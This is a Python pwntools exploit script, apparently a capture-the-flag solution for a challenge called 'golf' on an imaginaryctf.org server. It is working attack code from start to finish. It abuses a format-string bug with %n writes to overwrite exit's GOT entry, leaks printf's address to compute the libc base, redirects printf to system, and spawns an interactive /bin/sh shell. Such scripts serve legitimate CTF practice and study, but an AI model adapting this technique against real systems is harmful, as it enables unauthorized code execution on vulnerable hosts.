from pwn import *

io = remote("golf.chal.imaginaryctf.org", 1337)
file = ELF("./golf")

def consume(n):
    r = 0
    print()
    while r < n:
        b = io.recv(n - r, timeout=0.1)
        r += len(b)
        print(f"\x1b[A\x1b[1Kprogress: {r/n:.4f}")

fmt = "%*8$u%9$n"
payload =  fmt.encode().ljust(0x10, b'\x00')
payload += p64(file.symbols["main"])
payload += p64(file.got["exit"])

io.sendline(payload)

consume(file.symbols["main"])
io.recv()

fmt = "%8s:"
payload =  fmt.encode().ljust(0x10, b'\x00')
payload += p64(file.got["printf"])
io.sendline(payload)

leak = io.recvuntil(b":")[:-1]
leak = u64(leak + b"\x00\x00")
print(f"leak: {leak:8x}")
base = leak - 0x61c90
print(f"base: {base:8x}")
system = base + 0x52290
print(f"system: {system&0xFFFFFFFF:8x}")

payload =  fmt.encode().ljust(0x10, b'\x00')
payload += p64(system&0xFFFFFFFF)
payload += p64(file.got["printf"])

io.sendline(payload)

consume(system&0xFFFFFFFF)

io.sendline(b"/bin/sh\x00")
io.interactive()